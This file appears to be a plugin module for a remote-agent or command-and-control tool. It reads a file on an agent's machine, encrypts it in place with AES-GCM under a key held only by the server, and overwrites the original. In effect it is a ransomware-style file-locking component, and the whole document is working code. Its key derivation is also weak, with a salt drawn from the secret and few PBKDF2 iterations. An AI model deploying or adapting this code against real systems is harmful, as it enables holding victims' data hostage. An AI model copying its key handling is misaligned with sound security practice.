NAME = "encrypt"
DESCRIPTION = "Encrypt a file using the server's key."
PARAMS = [
    {"name":"file", "description":"Encrypt a file on the client using the server's key.", "type":"str"}
]

DEPENDENCIES = ["read", "write", "isencrypted"]
DEFAULT = True

def generate_encrypted_header():
    from flask import current_app
    from hashlib import pbkdf2_hmac
    secret = current_app.config["SECRET_KEY"].encode()
    salt = current_app.config["SECRET_KEY"][:16].encode()
    iterations = 200
    header = pbkdf2_hmac("sha256", secret, salt, iterations, dklen=32)[:8]
    return header

def encrypt_bytearray(data: bytearray, header) -> bytes:
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from hashlib import pbkdf2_hmac
    from flask import current_app
    secret = current_app.config["SECRET_KEY"]
    salt = os.urandom(16)
    nonce = os.urandom(12)
    key = pbkdf2_hmac("sha256", secret.encode("utf-8"), salt, 2000, dklen=32)
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, bytes(data), None)
    return header + salt + nonce + ciphertext


def function(agent_id, args):
    header = generate_encrypted_header()
    file = args[0]
    ret = isencrypted(agent_id, [file])
    if ret["retval"] != 0:
        return {"retval":-1, "message":"Error checking whether file is encrypted."}
    if ret["encrypted"] == "1":
        return {"retval":"File already encrypted"}
    data = read(agent_id, [file])
    if(data["retval"] != 0):
        return {"retval":"Error opening file"}
    encrypted = encrypt_bytearray(data["data"], header)
    write_ret = write(agent_id, [file, encrypted])
    import hashlib
    if write_ret["retval"] != 0:
        return {"retval":"Error writing"}
    return {"retval":0, "hash":hashlib.sha256(encrypted).hexdigest()} 